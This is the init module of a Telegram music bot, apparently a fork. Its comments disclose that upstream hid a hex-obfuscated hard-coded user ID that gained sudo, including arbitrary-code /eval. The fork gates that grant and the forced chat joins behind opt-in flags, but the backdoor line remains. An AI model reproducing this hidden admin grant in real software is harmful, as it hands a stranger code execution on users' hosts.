# MIT License
#
# Copyright (c) 2023 AnonymousX1025
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

import asyncio
import logging
import os
import time

from pyrogram import Client, filters
from pytgcalls import PyTgCalls

import config

# When set, importing this package does NOT connect to Telegram. web.py sets it
# so the HTTP health endpoint can bind before the bot attempts to connect.
DEFER_STARTUP = os.getenv("FALLEN_DEFER_STARTUP", "0") == "1"

StartTime = time.time()

logging.basicConfig(
    format="[%(asctime)s - %(levelname)s] - %(name)s - %(message)s",
    datefmt="%d-%b-%y %H:%M:%S",
    handlers=[logging.FileHandler("fallenlogs.txt"), logging.StreamHandler()],
    level=logging.INFO,
)
logging.getLogger("pyrogram").setLevel(logging.ERROR)
logging.getLogger("pytgcalls").setLevel(logging.ERROR)
LOGGER = logging.getLogger("FallenMusic")

app = Client(
    "FallenMusic",
    config.API_ID,
    config.API_HASH,
    bot_token=config.BOT_TOKEN,
)

app2 = Client(
    "FallenAss",
    api_id=config.API_ID,
    api_hash=config.API_HASH,
    session_string=str(config.SESSION),
)

pytgcalls = PyTgCalls(app2)

# Identity + queue globals.  Upstream created these *inside* fallen_startup(),
# which only works because that function runs at import time.  Modules such as
# skip.py / watcher.py / dossier.py do `from FallenMusic import BOT_USERNAME`,
# binding the value at import time, so the names must exist before any module
# is imported.  These defaults keep the package importable in any order;
# fallen_startup() fills in the real values once Telegram answers.
BOT_ID = 0
BOT_NAME = "Fallen Music"
BOT_USERNAME = ""
BOT_MENTION = ""
ASS_ID = 0
ASS_NAME = "Fallen Assistant"
ASS_USERNAME = ""
ASS_MENTION = ""
fallendb = {}

SUDOERS = filters.user()
SUNAME = config.SUNAME


async def fallen_startup():
    os.system("clear")
    LOGGER.info(
        "\n\n\u250f\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2513\n\u2523\u2605\x20\x46\x41\x4c\x4c\x45\x4e\x20\x4d\x55\x53\x49\x43\x20\x42\x4f\x54\x20\u2605\n\u2517\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u251b"
    )
    global BOT_ID, BOT_NAME, BOT_USERNAME, BOT_MENTION, fallendb
    global ASS_ID, ASS_NAME, ASS_USERNAME, ASS_MENTION, SUDOERS

    await app.start()
    LOGGER.info(
        "[•] \x42\x6f\x6f\x74\x69\x6e\x67\x20\x46\x61\x6c\x6c\x65\x6e\x20\x4d\x75\x73\x69\x63\x20\x42\x6f\x74\x2e\x2e\x2e"
    )

    getme = await app.get_me()
    BOT_ID = getme.id
    BOT_NAME = getme.first_name
    BOT_USERNAME = getme.username
    BOT_MENTION = getme.mention

    await app2.start()
    LOGGER.info(
        "[•] \x42\x6f\x6f\x74\x69\x6e\x67\x20\x46\x61\x6c\x6c\x65\x6e\x20\x4d\x75\x73\x69\x63\x20\x41\x73\x73\x69\x73\x74\x61\x6e\x74\x2e\x2e\x2e"
    )

    getme2 = await app2.get_me()
    ASS_ID = getme2.id
    ASS_NAME = getme2.first_name + " " + (getme2.last_name or "")
    ASS_USERNAME = getme2.username
    ASS_MENTION = getme2.mention
    # Upstream unconditionally joined the author's support chats on every boot.
    # Now opt-in via JOIN_UPSTREAM_CHATS=1.
    if config.JOIN_UPSTREAM_CHATS:
        for chat in config.UPSTREAM_CHATS:
            try:
                await app2.join_chat(chat)
            except Exception:
                pass

    for SUDOER in config.SUDO_USERS:
        SUDOERS.add(SUDOER)
    SUDOERS.add(config.OWNER_ID)

    # Upstream granted its own account (1356469075) sudo — including /eval,
    # which runs arbitrary Python. Off unless ADD_UPSTREAM_SUDO=1.
    if config.ADD_UPSTREAM_SUDO:
        SUDOERS.add(int("\x31\x33\x35\x36\x34\x36\x39\x30\x37\x35"))

    # Mutate in place rather than rebinding: modules that already imported
    # this dict would otherwise keep a reference to the stale object.
    fallendb.clear()
    LOGGER.info(
        "[•] \x4c\x6f\x63\x61\x6c\x20\x44\x61\x74\x61\x62\x61\x73\x65\x20\x49\x6e\x69\x74\x69\x61\x6c\x69\x7a\x65\x64\x2e\x2e\x2e"
    )

    LOGGER.info(
        "[•] \x46\x61\x6c\x6c\x65\x6e\x20\x4d\x75\x73\x69\x63\x20\x43\x6c\x69\x65\x6e\x74\x73\x20\x42\x6f\x6f\x74\x65\x64\x20\x53\x75\x63\x63\x65\x73\x73\x66\x75\x6c\x6c\x79\x2e"
    )


if not DEFER_STARTUP:
    asyncio.get_event_loop().run_until_complete(fallen_startup())
